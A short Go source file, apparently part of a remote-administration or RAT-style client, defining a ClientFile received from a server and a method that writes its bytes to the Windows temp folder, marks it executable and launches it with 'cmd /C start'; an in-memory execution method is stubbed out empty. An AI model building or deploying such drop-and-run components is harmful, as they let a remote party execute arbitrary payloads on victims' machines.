package system

import (
	"io/ioutil"
	"os"
	"os/exec"
)

// `ClientFile` represents a file and its attributes that will be exchanged with the server.
type ClientFile struct {
	Name    string `json:"name"`
	Content []byte `json:"content"`
}

// `ClientFile.ExecuteOnDisk` saves the files byte content to the temp folder and executes the file.
func (file *ClientFile) ExecuteOnDisk() error {
	path := os.TempDir() + "\\" + file.Name

	// Write the file to disk.
	err := ioutil.WriteFile(path, file.Content, 0666)
	if err != nil {
		return err
	}

	// Give the file executable permissions.
	err = os.Chmod(path, 0777)
	if err != nil {
		return err
	}

	// Execute/open the file.
	cmd := exec.Command("cmd", "/C", "start", path)
	if err := cmd.Run(); err != nil {
		return err
	}

	return nil
}

// `ClientFile.ExecuteInMemory` executes the files byte content in memory.
func (file *ClientFile) ExecuteInMemory() error {
	return nil
}
